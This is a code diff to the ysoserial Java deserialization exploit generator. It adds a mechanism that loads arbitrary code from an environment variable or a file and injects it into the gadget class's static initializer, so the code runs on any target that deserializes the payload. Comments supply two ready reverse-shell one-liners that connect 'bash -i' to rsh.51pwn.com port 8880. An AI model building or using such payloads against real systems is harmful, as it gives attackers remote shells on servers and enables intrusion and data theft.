@@ -106,6 +106,36 @@ public class Gadgets {
         CtClass superC = pool.get(abstTranslet.getName());
         CtClass ctClass;
 
+        // sample cmd
+        String cmd = "";
+        // export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
+        // try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
+        // # 1 env
+        String szInjecting = "Custom_Code_51pwn";
+        String szEvCmd = System.getenv(szInjecting);
+        if(""!=szEvCmd){
+            cmd = szEvCmd;
+        }
+        // # 2 file
+        File file = new File(szInjecting);
+        if(file.exists()){
+            byte[] bytes1 = new byte[(int) file.length()];
+            FileInputStream fis = null;
+            try{
+                fis = new FileInputStream(file);
+                if (0 < fis.read(bytes1)) {
+                    cmd = new String(bytes1);
+                }
+            }catch (Exception e){}
+            finally {
+                if(null !=fis){fis.close();}
+            }
+        }
+
+        // 兼容原来的
+        if(""!=cmd)
+        superC.makeClassInitializer().insertAfter(cmd);
+
         if (command != null) {
             ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
             ctClass.setName(ctClass.getName() + System.nanoTime());
